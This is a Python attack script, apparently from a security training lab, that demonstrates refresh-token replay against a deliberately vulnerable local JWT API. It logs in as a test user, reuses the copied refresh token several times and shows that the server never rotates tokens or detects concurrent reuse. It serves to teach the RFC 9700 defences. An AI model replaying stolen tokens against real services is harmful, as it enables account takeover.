#!/usr/bin/env python3
"""
Attack: Refresh Token Replay (No Rotation, No Reuse Detection)
Target: System 5 vulnerable JWT API (http://localhost:5008)
Demonstrates: A stolen refresh token grants indefinite fresh access tokens,
              and the legitimate user keeps working with the SAME refresh token
              in parallel - the server never detects the duplicate use.
Reference: RFC 9700 s4.13 (Refresh Token Protection - rotation + reuse detection)
"""

import requests

TARGET = "http://localhost:5008"


def redeem(refresh_token, who):
    r = requests.post(f"{TARGET}/refresh",
                      json={"refresh_token": refresh_token})
    ok = r.status_code == 200 and "access_token" in r.json()
    print(f"    [{who}] /refresh -> HTTP {r.status_code} "
          f"{'(got fresh access token)' if ok else '(denied)'}")
    return ok


def main():
    print("[*] Attack: refresh token replay")
    print("[*] Target:", TARGET)

    # Legit login. The refresh token is the long-lived credential we care about.
    r = requests.post(f"{TARGET}/login",
                      json={"username": "alice", "password": "password123"})
    refresh = r.json()["refresh_token"]
    print("[*] alice logs in and receives a refresh token")

    # Attacker exfiltrates a COPY of the refresh token (same string).
    stolen = refresh
    print("[*] Attacker steals a copy of the refresh token\n")

    print("[*] Attacker redeems the stolen token repeatedly:")
    a1 = redeem(stolen, "attacker #1")
    a2 = redeem(stolen, "attacker #2")
    a3 = redeem(stolen, "attacker #3")

    print("\n[*] Meanwhile the LEGITIMATE user refreshes with the same token:")
    legit = redeem(refresh, "victim    ")

    if a1 and a2 and a3 and legit:
        print("\n[+] Attack succeeded. The stolen refresh token minted three")
        print("    access tokens and the victim's session kept working too.")
        print("    No rotation means the token never changes; no reuse detection")
        print("    means concurrent use by two parties raises no alarm.")


if __name__ == "__main__":
    main()
